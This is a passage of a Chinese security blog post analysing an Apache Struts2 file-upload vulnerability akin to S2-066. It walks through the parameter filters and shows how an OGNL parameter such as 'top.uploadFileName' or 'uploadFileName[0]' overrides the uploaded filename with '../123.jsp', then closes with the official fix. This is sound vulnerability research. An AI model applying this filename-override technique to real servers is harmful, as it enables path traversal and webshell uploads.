class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (len-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> ta[to++];</span><br><span class="line">        <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> pa[po++];</span><br><span class="line">        <span class="keyword">if</span> (c1 == c2) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ignoreCase) &#123;</span><br><span class="line">            <span class="comment">// If characters don&#x27;t match but case may be ignored,</span></span><br><span class="line">            <span class="comment">// try converting both characters to uppercase.</span></span><br><span class="line">            <span class="comment">// If the results match, then the comparison scan should</span></span><br><span class="line">            <span class="comment">// continue.</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">u1</span> <span class="operator">=</span> Character.toUpperCase(c1);</span><br><span class="line">            <span class="type">char</span> <span class="variable">u2</span> <span class="operator">=</span> Character.toUpperCase(c2);</span><br><span class="line">            <span class="keyword">if</span> (u1 == u2) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Unfortunately, conversion to uppercase does not work properly</span></span><br><span class="line">            <span class="comment">// for the Georgian alphabet, which has strange rules about case</span></span><br><span class="line">            <span class="comment">// conversion.  So we need to make one last check before</span></span><br><span class="line">            <span class="comment">// exiting.</span></span><br><span class="line">            <span class="keyword">if</span> (Character.toLowerCase(u1) == Character.toLowerCase(u2)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见这里会逐位比较，要满足两个字符，本身相等或同时转大写相等或同时转小写相等就会被认为相等。显然仅仅是利用上面的特性不足以完成这个壮举。</p>
+<p>后面在分析的时候发现，即使存在一个特殊字符恰好能满足苛刻的要求也不能用于payload</p>
+<p>因为在参数被put到<code>acceptableParameters</code>前，会调用<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#isAcceptableParameter</code>进行检查</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">acceptableName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isIgnoredDMI(name)) &#123;</span><br><span class="line">        LOG.trace(<span class="string">&quot;DMI is enabled, ignoring DMI method: &#123;&#125;&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">accepted</span> <span class="operator">=</span> <span class="built_in">this</span>.isWithinLengthLimit(name) &amp;&amp; !<span class="built_in">this</span>.isExcluded(name) &amp;&amp; <span class="built_in">this</span>.isAccepted(name);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.devMode &amp;&amp; accepted) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;Parameter [&#123;&#125;] was accepted and will be appended to action!&quot;</span>, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> accepted;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先通过<code>isIgnoredDMI()</code>黑名单检查，正则匹配<code>^(action|method):.*</code>，匹配不到则else逻辑部分</p>
+<p>然后通过黑名单校验和白名单校验（长度校验只会warning，无伤大雅）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">黑名单正则表达式1</span><br><span class="line">(^|\%\&#123;)((#?)(top(\.|\[&#x27;|\[&quot;)|\[\d\]\.)?)(dojo|struts|session|request|response|application|servlet(Request|Response|Context)|parameters|context|_memberAccess)(\.|\[).*</span><br><span class="line">黑名单正则表达式2</span><br><span class="line">.*(^|\.|\[|\&#x27;|&quot;|get)class(\(\.|\[|\&#x27;|&quot;).*</span><br><span class="line">白名单正则表达式</span><br><span class="line">\w+((\.\w+)|(\[\d+])|(\(\d+\))|(\[&#x27;(\w-?|[\u4e00-\u9fa5]-?)+&#x27;])|(\(&#x27;(\w-?|[\u4e00-\u9fa5]-?)+&#x27;\)))*</span><br></pre></td></tr></table></figure>
+
+<p>暂且不说黑名单，白名单校验也无法通过，这里只允许几种样式的参数通过校验，严格限制了字符集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaaa</span><br><span class="line">aaaa.aa</span><br><span class="line">aaaa[&#x27;abc&#x27;]</span><br><span class="line">aaaa(&#x27;abc&#x27;)</span><br><span class="line">aaaa[0]</span><br><span class="line">aaaa(0)</span><br></pre></td></tr></table></figure>
+
+<p>那么只能另寻他路了，回到思考如何在ognl参数绑定时如何进行参数覆盖</p>
+<p><img src="https://s2.loli.net/2024/12/20/HAZ2JKSGzftCy6R.png" alt="img"></p>
+<p>在<code>FileUploadInterceptor#intercept</code>处理后传给<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>进行参数绑定</p>
+<p>跟进<code>newStack.setParameter(name, value.getObject());</code>这段代码可以发现使用了<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setValue(java.lang.String, java.lang.Object, boolean)</code>进行实现，而这个方法允许使用OGNL表达式</p>
+<blockquote>
+<p>setParameter</p>
+<p>void setParameter(String expr, Object value)</p>
+<p>Attempts to set a property on a bean in the stack with the given expression using the default search order. N.B.: unlike #setValue(String,Object) it doesn’t allow eval expression.</p>
+<p>Parameters:</p>
+<p>expr - the expression defining the path to the property to be set.</p>
+<p>value - the value to be set into the named property</p>
+</blockquote>
+<p>关于OGNL表达式的基础知识可以参考这篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</a></p>
+<p>于是可以用OGNL表达式操作一波，看看能否获取到uploadFileName从而实现覆盖</p>
+<p>先说说多文件上传的情况</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadsAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> List&lt;File&gt; upload;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; uploadContentType;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; uploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见这里是List，结合OGNL表达式和白名单校验，很容易联想到使用<code>uplooadFileName[0]</code>就可以获取到第一个文件的文件名</p>
+<p>由S2-066的分析可知，要能在<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setParameter</code>覆盖原始的文件名，则必须要让被覆盖的键值对在TreeMap对象中更靠前，于是这里给upload首字母大写为Upload，然后加上uploadFileName[0]一起传入文件上传接口</p>
+<p>在<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setValue(java.lang.String, java.lang.Object, boolean)</code>方法下个断点</p>
+<p><img src="https://s2.loli.net/2024/12/20/4dzWjRoMI2DhaJL.png" alt="img"></p>
+<p>调试这里的代码即可发现，成功由<code>uploadFileName[0]</code>获取到原始文件名<code>1.txt</code>，然后<code>setValue</code>覆盖目标值为<code>../123.jsp</code></p>
+<p>然后聊聊单文件上传的情况，类似地，既然大小写不能解决，就通过OGNL表达式获取</p>
+<p>经过深入的调试可以找到这里OGNL表达式生成语法树后获取相应值的逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getProperty:122, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)</span><br><span class="line">getProperty:3344, OgnlRuntime (ognl)</span><br><span class="line">getValueBody:121, ASTProperty (ognl)</span><br><span class="line">evaluateGetValueBody:212, SimpleNode (ognl)</span><br><span class="line">getValue:258, SimpleNode (ognl)</span><br><span class="line">setValueBody:222, ASTChain (ognl)</span><br><span class="line">evaluateSetValueBody:220, SimpleNode (ognl)</span><br><span class="line">setValue:308, SimpleNode (ognl)</span><br><span class="line">setValue:829, Ognl (ognl)</span><br><span class="line">lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">execute:-1, 1943089905 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$106)</span><br><span class="line">compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)</span><br><span class="line">doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getProperty</span><span class="params">(Map context, Object target, Object name)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">    <span class="type">CompoundRoot</span> <span class="variable">root</span> <span class="operator">=</span> (CompoundRoot)target;</span><br><span class="line">    <span class="type">OgnlContext</span> <span class="variable">ognlContext</span> <span class="operator">=</span> (OgnlContext)context;</span><br><span class="line">    <span class="keyword">if</span> (name <span class="keyword">instanceof</span> Integer) &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">index</span> <span class="operator">=</span> (Integer)name;</span><br><span class="line">        <span class="keyword">return</span> root.cutStack(index);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(name <span class="keyword">instanceof</span> String)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;top&quot;</span>.equals(name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> root.size() &gt; <span class="number">0</span> ? root.get(<span class="number">0</span>) : <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(Object o : root) &#123;</span><br><span class="line">            <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (OgnlRuntime.hasGetProperty(ognlContext, o, name) || o <span class="keyword">instanceof</span> Map &amp;&amp; ((Map)o).containsKey(name)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> OgnlRuntime.getProperty(ognlContext, o, name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (OgnlException e) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getReason() != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Caught an Ognl exception while getting property &quot;</span> + name;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StrutsException</span>(msg, e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IntrospectionException var11) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (context.containsKey(OgnlValueStack.THROW_EXCEPTION_ON_FAILURE)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchPropertyException</span>(target, name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里top会获取root根元素的第一个元素，而此时第一个就是UploadAction对象</p>
+<p><img src="https://s2.loli.net/2024/12/20/QGNUfezOpLoicA7.png" alt="img"></p>
+<p>于是可以用<code>top.uploadFileName</code>这个OGNL表达式获取到原始文件名，并且<code>t</code>在TreeMap对象中可以比<code>U</code>排更后面，从而覆盖原始文件名</p>
+<p><img src="https://s2.loli.net/2024/12/20/XWrVyLpOcU1FPTE.png" alt="img"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>和官方漏洞通告所述一致，这里核心思路和S2-066差不多，只是这里通过OGNL表达式获取需要覆盖的对象</p>
+<p>而官方的修复建议如下</p>
+<blockquote>
+<p>Upgrade to Struts 6.4.0 or greater and use Action File Upload Interceptor</p>
+</blockquote>
+<p>修改struts2依赖到<code>6.4.0</code>或更高可以找到这个上传机制的实现逻辑</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> invocation.getInvocationContext().getServletRequest();</span><br><span class="line">    <span class="keyword">if</span> (!(request <span class="keyword">instanceof</span> MultiPartRequestWrapper)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">ActionProxy</span> <span class="variable">proxy</span> <span class="operator">=</span> invocation.getProxy();</span><br><span class="line">            LOG.debug(<span class="built_in">this</span>.getTextMessage(<span class="string">&quot;struts.messages.bypass.request&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;proxy.getNamespace(), proxy.getActionName()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">MultiPartRequestWrapper</span> <span class="variable">multiWrapper</span> <span class="operator">=</span> (MultiPartRequestWrapper)request;</span><br><span class="line">        <span class="keyword">if</span> (!(invocation.getAction() <span class="keyword">instanceof</span> UploadedFilesAware)) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;Action: &#123;&#125; doesn&#x27;t implement: &#123;&#125;, ignoring file upload&quot;</span>, invocation.getProxy().getActionName(), UploadedFilesAware.class.getSimpleName());</span><br><span class="line">            <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">UploadedFilesAware</span> <span class="variable">action</span> <span class="operator">=</span> (UploadedFilesAware)invocation.getAction();</span><br><span class="line">            <span class="built_in">this</span>.applyValidation(action, multiWrapper);</span><br><span class="line">            Enumeration&lt;String&gt; fileParameterNames = multiWrapper.getFileParameterNames();</span><br><span class="line">            List&lt;UploadedFile&gt; acceptedFiles = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(fileParameterNames != <span class="literal">null</span> &amp;&amp; fileParameterNames.hasMoreElements()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">inputName</span> <span class="operator">=</span> (String)fileParameterNames.nextElement();</span><br><span class="line">                UploadedFile[] uploadedFiles = multiWrapper.getFiles(inputName);</span><br><span class="line">                <span class="keyword">if</span> (uploadedFiles != <span class="literal">null</span> &amp;&amp; uploadedFiles.length != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(UploadedFile uploadedFile : uploadedFiles) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.acceptFile(action, uploadedFile, uploadedFile.getOriginalName(), uploadedFile.getContentType(), inputName)) &#123;</span><br><span class="line">                            acceptedFiles.add(uploadedFile);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                    LOG.warn(<span class="built_in">this</span>.getTextMessage(action, <span class="string">&quot;struts.messages.invalid.file&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (acceptedFiles.isEmpty()) &#123;</span><br><span class="line">                LOG.debug(<span class="string">&quot;No files have been uploaded/accepted&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                LOG.debug(<span class="string">&quot;Passing: &#123;&#125; uploaded file(s) to action&quot;</span>, acceptedFiles.size());</span><br><span class="line">                action.withUploadedFiles(acceptedFiles);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见这里和原本的逻辑发生了较大变化，只处理了文件上传相关的参数，也就不存在覆盖的问题了</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/12/20/CVE-2024-42327：Zabbix SQL注入漏洞分析/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"Cbgk0YxBpLhiX5GAO3blh1dL-gzGzoHsz","appKey":"sXGSZcQ400OknswrtdEDSiTp","placeholder":"Comment with Email address will get notification when replied","visitor":false,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":false}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "Comment with Email address will get notification when replied",
+    //     avatar:"monsterid",
+    //     visitor: "false",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-12-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/cve/">cve<span>5</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/security/">security<span>6</span></a></li> <li><a href="/tags/struts/">struts<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-article-text">漏洞简介</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-article-text">影响版本</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-article-text">环境搭建</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-article-text">漏洞复现</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8D%95%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-article-text">单文件上传</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%A4%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-article-text">多文件上传</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-article-text">漏洞分析</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-article-text">总结</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 ph0ebus's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
